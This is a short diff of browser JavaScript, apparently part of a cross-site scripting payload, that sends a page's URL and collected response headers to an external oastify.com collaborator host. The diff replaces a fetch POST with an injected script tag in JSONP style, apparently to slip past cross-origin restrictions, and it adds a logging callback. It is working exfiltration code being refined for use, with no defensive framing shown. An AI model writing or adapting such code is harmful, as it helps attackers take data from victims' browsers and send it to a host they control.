@@ -12,17 +12,16 @@
                 return acc;
             }, {});
 
-            fetch('https://wiipwopcfbhn6lszs7ws4aiz6qch0cu0j.oastify.com/collect-headers', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    url: window.location.href,
-                    headers: headersList
-                })
-            });
+            // Create JSONP request
+            var script = document.createElement('script');
+            script.src = 'https://1z1udt6hwgysnq949cdxlfz4nvtmhhc51.oastify.com/collect-headers?callback=sendHeaders&url=' + encodeURIComponent(window.location.href) + '&headers=' + encodeURIComponent(JSON.stringify(headersList));
+            document.body.appendChild(script);
         }
     };
     xhr.send();
 })();
+
+// Define the JSONP callback function
+function sendHeaders(data) {
+    console.log('Headers sent:', data);
+}
